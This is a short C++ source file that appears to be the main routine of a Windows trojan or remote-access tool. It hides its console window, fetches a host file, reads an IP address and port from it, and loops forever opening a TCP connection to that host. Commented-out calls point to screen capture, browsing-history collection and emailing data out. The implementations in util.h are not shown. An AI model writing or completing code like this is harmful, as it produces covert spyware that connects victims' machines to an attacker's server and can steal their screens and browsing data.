//do not show the cmd windows
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#include "util.h"
#include<typeinfo>
#include<stdio.h>
#include<stdlib.h>
#include<string>

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )



int main()
{
	//copy();
	//ScreenCapture("asd.jpg");
	//getHistory();
	//list<string> l;
	//sendemail(l);
	for(int i=0;i<10;++i)
	{
		if(get_host_file())
			break;
	}
	ifstream infile("hosts.txt");
	string ip;
	string port;
	if(infile)
	{
		getline(infile, ip);
		getline(infile, port);
		infile.close();
		while (true)
		{
			tcpconnect(ip.c_str(), port.c_str());
		}
	}
	return 0;
}